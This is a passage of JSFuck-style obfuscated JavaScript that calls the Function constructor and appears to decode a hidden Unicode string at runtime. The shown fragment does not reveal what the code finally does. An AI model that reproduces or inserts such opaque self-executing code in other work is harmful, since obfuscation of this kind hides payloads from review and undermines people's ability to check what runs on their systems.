+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+[]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+